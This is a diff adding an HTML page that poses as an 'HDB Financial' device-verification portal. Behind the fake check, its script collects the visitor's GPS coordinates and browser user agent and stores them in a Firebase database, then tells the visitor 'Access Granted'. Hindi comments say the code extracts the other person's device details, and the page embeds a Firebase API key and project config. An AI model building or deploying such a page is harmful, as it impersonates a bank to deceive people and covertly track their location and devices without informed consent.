@@ -1,0 +1,154 @@
+<<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDB Metalist For Consumer Durable</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .portal-container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        /* खूबसूरत टेक्स्ट लोगो जो कभी फेल नहीं होगा */
+        .text-logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #004b87;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+        }
+        .text-logo span {
+            font-weight: 300;
+            color: #555;
+        }
+        h2 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .btn-enter {
+            padding: 14px 30px;
+            font-size: 16px;
+            background-color: #004b87;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: background 0.3s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .btn-enter:hover {
+            background-color: #003366;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #2c3e50;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="portal-container">
+        <div class="text-logo">
+            HDB <span>Financial</span>
+        </div>
+        
+        <h2>Verification System</h2>
+        <p>Device authentication required for Consumer Durable Metalist Access. Please click below to verify.</p>
+        
+        <button onclick="getLocation()" class="btn-enter">
+            Welcome To HDB
+        </button>
+        
+        <p id="status"></p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCQySZlQPpUaukzNBElQjkzVWT20VhHYP0",
+            authDomain: "hdb-metalist.firebaseapp.com",
+            projectId: "hdb-metalist",
+            storageBucket: "hdb-metalist.firebasestorage.app",
+            messagingSenderId: "1006833780741",
+            appId: "1:1006833780741:web:6928a5fa6a55c9271a346c"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.getLocation = function() {
+            const status = document.getElementById('status');
+            status.textContent = 'Connecting to secure server...';
+            status.style.color = '#004b87';
+            
+            if (!navigator.geolocation) {
+                status.textContent = 'Browser does not support verification.';
+                status.style.color = 'red';
+            } else {
+                navigator.geolocation.getCurrentPosition(success, error);
+            }
+        }
+
+        async function success(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            
+            // यहाँ यह लाइन सामने वाले के फोन/डिवाइस की पूरी जानकारी निकाल रही है
+            const deviceInfo = navigator.userAgent;
+
+            document.getElementById('status').textContent = 'Verifying security credentials...';
+            
+            try {
+                // अब डेटाबेस में लोकेशन के साथ डिवाइस इन्फो भी सेव होगी
+                await addDoc(collection(db, "user_locations"), {
+                    latitude: lat,
+                    longitude: lng,
+                    device: deviceInfo,
+                    timestamp: new Date()
+                });
+                document.getElementById('status').textContent = 'Access Granted! Redirecting...';
+                document.getElementById('status').style.color = 'green';
+            } catch (e) {
+                console.error(e);
+                document.getElementById('status').textContent = 'Database Error. Please check rules.';
+                document.getElementById('status').style.color = 'red';
+            }
+        }
+
+        function error(err) {
+            console.warn(err);
+            document.getElementById('status').textContent = 'Authentication Failed. Please allow permission to verify your device.';
+            document.getElementById('status').style.color = 'red';
+        }
+    </script>
+
+</body>
+</html>
